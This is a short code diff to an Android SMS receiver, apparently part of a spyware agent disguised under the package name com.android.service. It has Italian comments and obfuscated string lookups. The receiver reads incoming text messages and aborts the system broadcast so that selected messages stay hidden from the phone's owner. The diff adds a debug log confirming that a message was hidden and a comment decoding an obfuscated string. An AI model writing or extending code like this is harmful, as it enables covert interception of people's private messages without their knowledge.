@@ -18,8 +18,8 @@ import android.telephony.SmsMessage;
 import com.android.service.Core;
 import com.android.service.Messages;
 import com.android.service.ServiceCore;
-import com.android.service.Sms;
 import com.android.service.auto.Cfg;
+import com.android.service.module.message.Sms;
 import com.android.service.util.Check;
 
 public class BroadcastMonitorSms extends BroadcastReceiver {
@@ -62,6 +62,7 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 		SmsMessage[] msgs = null;
 
 		// Prendiamo l'sms
+		// 26.0 = pdus
 		final Object[] pdus = (Object[]) bundle.get(Messages.getString("26.0")); //$NON-NLS-1$
 		msgs = new SmsMessage[pdus.length];
 
@@ -75,6 +76,9 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			// 1 means "remove notification for this sms"
 			if ((result & 1) == 1) {
 				abortBroadcast();
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive): hidden, broadcast aborted");
+				}
 			}
 		}
 	}
